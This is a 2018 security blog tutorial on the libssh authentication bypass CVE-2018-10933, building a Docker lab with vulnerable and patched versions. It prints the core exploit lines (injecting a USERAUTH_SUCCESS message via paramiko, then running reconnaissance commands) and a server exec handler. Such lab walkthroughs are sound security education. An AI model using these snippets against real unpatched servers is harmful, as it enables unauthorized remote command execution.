---
slug: libssh-bypass-cve/
title: LibSSH New Vulnerability
date: 2018-10-18
category: attacks
subtitle: New vulnerability on libssh CVE-2018-10933
tags: security, bug, libssh, pentesting
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620330935/blog/libssh-bypass-cve/cover_ad5zp7.webp
alt: Painting a red and blue wall
description: Here, we will explain a vulnerability that allows a remote
  attacker to bypass authentication by sending a user-authenticated
  packet to the server.
keywords: Libssh, Security, CVE, Vulnerability, Pentesting, PoC,
  Ethical Hacking, Pentesting
author: Jonathan Armas
writer: johna
name: Jonathan Armas
about1: Systems Engineer, Security+
about2: '"Be formless, shapeless like water" Bruce Lee'
source: https://unsplash.com/photos/d6YyP28-Ycw
---

The new vulnerability in `LibSSH`, tracked as
[CVE-2018-10933](https://www.libssh.org/security/advisories/CVE-2018-10933.txt),
resides on the server code which can enable a client to bypass the
authentication process and create channels without permission. This
affects servers using versions `0.6` and above being used in server
mode.

The bug was discovered by Peter Winter-Smith of NCC Group, it’s like a
`jedi` trick:

- User: `Let me in`

- Server: NO

- User: `I’m authenticated, let me in`

- Server: OK, YOU’RE IN

Why does this happen? Because of the way `LibSSH` checks for
authentication when it receives an `SSH2_MSG_USERAUTH_SUCCESS` message
instead of the `SSH2_MSG_USERAUTH_REQUEST` message. It acts like the
user is already authenticated, so an attacker could bypass the
authentication and execute commands on the server.

## Building the enviroment

How does LibSSH work? It’s a `C` library to implement `SSHv2` protocol
on the client and server side. First, we need to write our server-side
code. We are going to use the sample that `LibSSH` has
(`samplesshd-cb.c`) and modify it for our purposes.

In the `ssh_channel_callbacks_struct` we are going to put the following
line in order to have the `exec` functionality:

**exec request.**

``` C
.channel_exec_request_function = exec_request
```

<div class="imgblock">

![channel-exec](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330934/blog/libssh-bypass-cve/channel-exec_nkvv1s.webp)

</div>

Next, add the `exec_request` function, this will take our commands and
execute them on the server:

``` C
static int exec_nopty(const char *command) {
            /* exec the requested command. */
            execl("/bin/sh", "sh", "-c", command, NULL);
            exit(0);

    return SSH_OK;
}

static int exec_request(ssh_session session, ssh_channel channel,
                        const char *command, void *userdata) {

    printf("Allocated exec  \n");
    (void) userdata;
    (void) session;
    (void) channel;

    return exec_nopty(command);
}
```

If you have `LibSSH` with version `0.7.4` you can simply save it,
compile it, and execute it. If not, you can use our method. We are going
to use a `docker` container and install both versions (a vulnerable one
and a patched one) and then, pass our code to the server and run it. The
example files can be downloaded [here](cve201810933.zip).

To build the container, open a `terminal` in the folder of the
`Dockerfile` and run this command:

``` bash
host$ docker build -t fluidattackscve201810933 .
```

This will download all the necessary files and compile all the sources
of `LibSSH`.

Then, to open the container simply run this command:

``` bash
host$ docker run -it -p 2222:2222 fluidattackscve201810933:latest /bin/bash
```

This is going to mirror our port `2222` to the container port `2222` in
order to be able to run our tests. Also, it will open a `bash` terminal
on the container machine where we will run our `LibSSH` server.

## Exploiting the vulnerability

In this case, we are going to use `LibSSH v0.7.4` and test the solution
with `LibSSH v0.7.6`. The `PoC` is on `Python` version `2`, and you can
check its source
[here](https://www.openwall.com/lists/oss-security/2018/10/17/5), but if
you downloaded our files, it’s there as `exploit.py`.

In order to run this `PoC` you will need `paramiko`. You can install it
by running:

``` bash
host$ pip install paramiko
```

In the container, run the following command to start the vulnerable
`LibSSH` server:

``` bash
container$ ./tmp/libssh-0.7.4/build/examples/samplesshd-cb -k ~/.ssh/id_dsa 0.0.0.0 -k ~/.ssh/id_rsa -p 2222 --verbose
```

The verbose flag is to see what is sending and receiving our server.

Then, in your machine run the exploit with:

``` bash
host$ python exploit.py
```

If you check your container you can see this:

<div class="imgblock">

![ssh-bypass](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330933/blog/libssh-bypass-cve/ssh-bypass_zj8e91.webp)

</div>

When the server is expecting the `SSH2_MSG_USERAUTH_REQUEST`, we are
sending an `SSH2_MSG_USERAUTH_SUCCESS`.

``` python
m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
transport._send_message(m)
```

The server accepts it, and we bypassed the authentication. Then, we can
send our commands to the server with:

``` python
cmd_channel.exec_command("whoami; id; ls -la /; ip addr")
```

<div class="imgblock">

![command-exec](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330934/blog/libssh-bypass-cve/command-exec_yuqxav.webp)

</div>

## The solution

<div class="imgblock">

![dont-work](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330934/blog/libssh-bypass-cve/dont-work_qzntdl.webp)

</div>

The LibSSH version `0.7.6` doesn’t have this vulnerability. We can test
it, too, in our container. We just need to run:

``` bash
container$ ./tmp/libssh-0.7.6/build/examples/samplesshd-cb -k ~/.ssh/id_dsa 0.0.0.0 -k ~/.ssh/id_rsa -p 2222 --verbose
```

And on our machine the exploit again:

``` bash
host$ python exploit.py
```

<div class="imgblock">

![no-vulnerable](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330933/blog/libssh-bypass-cve/no-vulnerable_z7vihm.webp)

</div>

What’s happening? We send the `SSH2_MSG_USERAUTH_SUCCESS`. The server
receives it, but it won’t authenticate us because they added a
validation on their code. When the packet is
`SSH2_MSG_USERAUTH_SUCCESS`, then, it checks for the authentication
state. If it is not one of the valid states, it denies the packet.

<div class="imgblock">

![Code on
src/packet.c](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330934/blog/libssh-bypass-cve/solution_uaqs60.webp)

<div class="title">

Figure 1. Code on src/packet.c

</div>

</div>

Here you can see the difference between responses for a vulnerable
version and a non-vulnerable one.

<div class="imgblock">

![Vulnerable](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330933/blog/libssh-bypass-cve/vulnerable_mbwn5t.webp)

<div class="title">

Figure 2. Vulnerable

</div>

</div>

<div class="imgblock">

![Non-vulnerable](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330933/blog/libssh-bypass-cve/no-vulnerable_z7vihm.webp)

<div class="title">

Figure 3. Non-vulnerable

</div>

</div>

If you have `LibSSH` in your server, and you are using a server
component, you should install the updated, or patched, versions of
`LibSSH`.
